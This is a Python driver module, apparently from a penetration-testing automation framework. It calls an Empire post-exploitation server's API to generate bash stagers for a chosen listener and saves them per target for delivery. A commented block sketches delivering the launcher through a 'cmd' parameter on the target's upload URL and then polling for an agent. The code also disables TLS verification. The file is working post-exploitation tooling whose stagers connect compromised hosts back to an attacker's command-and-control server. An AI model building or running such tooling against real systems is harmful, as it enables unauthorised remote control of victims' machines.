# modules/drivers/post_exploit/empire_driver.py

import os
import time
import requests
from urllib.parse import urljoin
from modules.core.driver import BaseToolDriver, DriverResult, ParsedResult
from modules.core.utils import safe_target_path


class EmpireDriver(BaseToolDriver):
    """
    Driver for Empire post-exploitation via its REST API.
    Generates a bash stager, saves it for manual/automated delivery, and parses it.
    """
    name = "post"

    def __init__(self, config: dict, session_mgr, logger):
        super().__init__(config, session_mgr, logger)
        self.api_url = config["empire_api_url"].rstrip("/")
        # Use 'Bearer ' prefix if Empire requires it; adjust if plain token
        self.headers = {"Authorization": f"Bearer {config['empire_api_token']}"}
        self.listener = config.get("empire_listener", "http")
        self.outdir = config.get("empire_output_dir", "results/raw/empire")
        os.makedirs(self.outdir, exist_ok=True)

    def run(self, target: str, **kwargs) -> DriverResult:
        """
        1. Request a bash launcher from Empire API
        2. Save the launcher script to disk
        """
        # Prepare launcher payload
        payload = {
            "Listener": self.listener,
            "Language": "bash"
        }
        self.logger.info(f"[EmpireDriver] Generating bash stager for listener '{self.listener}'", extra={"target": target})

        # Call Empire's launcher endpoint
        url = urljoin(self.api_url, "/api/v2/launcher")
        resp = requests.post(url, headers=self.headers, json=payload, verify=False)
        resp.raise_for_status()
        data = resp.json().get("data", {})
        launcher = data.get("launcher") or data.get("Launcher")
        if not launcher:
            raise RuntimeError(f"EmpireDriver: no launcher in API response for {target}")

        # Save launcher to file for delivery
        safe = safe_target_path(target)
        out_file = os.path.join(self.outdir, f"{safe}.sh")
        with open(out_file, "w") as f:
            f.write(launcher)
        self.logger.info(f"[EmpireDriver] Launcher saved to {out_file}", extra={"target": target})

        # Optionally, you could auto-deliver here via session_mgr, e.g.:
        # session = self.session_mgr.get(target)
        # session.get(f"http://{target}/upload?cmd={launcher}")
        # Then poll for agent

        return DriverResult(raw_output=out_file)

    def parse(self, raw_output_path: str) -> ParsedResult:
        """
        Reads the saved launcher script and returns it as parsed data.
        """
        try:
            with open(raw_output_path) as f:
                content = f.read()
        except FileNotFoundError:
            self.logger.warning(f"[EmpireDriver] Missing launcher file: {raw_output_path}")
            return ParsedResult(data={})

        # Return the launcher for reporting
        return ParsedResult(data={"launcher": content})
